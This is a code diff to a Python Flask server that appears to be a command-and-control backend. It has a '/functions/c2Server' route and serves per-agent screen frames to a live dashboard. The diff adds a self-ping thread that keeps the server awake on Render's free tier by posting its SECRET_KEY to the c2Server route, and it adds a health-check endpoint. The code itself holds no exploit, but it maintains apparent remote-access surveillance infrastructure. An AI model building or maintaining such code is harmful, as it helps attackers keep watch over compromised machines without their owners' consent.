@@ -61,6 +61,26 @@ def init_db():
 
 init_db()
 
+# ── Self keep-alive: prevent Render free-tier sleep ────────────
+import threading as _ka_th, urllib.request as _ka_req
+
+def _self_ping():
+    import time as _t
+    _t.sleep(60)  # wait for server to fully start
+    while True:
+        try:
+            _ka_req.urlopen(
+                f"http://localhost:{os.environ.get('PORT', 5000)}/functions/c2Server",
+                data=b'{"route":"stats","key":"' + SECRET_KEY.encode() + b'"}',
+                timeout=10
+            )
+        except Exception:
+            pass
+        _t.sleep(840)  # ping every 14 minutes
+
+_ka_th.Thread(target=_self_ping, daemon=True).start()
+
+
 # ══════════════════════════════════════════════════════════════
 #  HELPERS
 # ══════════════════════════════════════════════════════════════
@@ -718,6 +738,13 @@ def get_frame(agent_id):
         return jsonify({"frame": None, "ts": 0})
     return jsonify({"frame": data["frame"], "ts": data["ts"],
                     "width": data.get("width", 800), "height": data.get("height", 600)})
+
+# ══════════════════════════════════════════════════════════════
+#  HEALTH CHECK
+# ══════════════════════════════════════════════════════════════
+@app.route("/health", methods=["GET"])
+def health():
+    return jsonify({"status": "ok", "ts": int(time.time())})
 
 # ══════════════════════════════════════════════════════════════
 #  LIVE DASHBOARD ROUTE
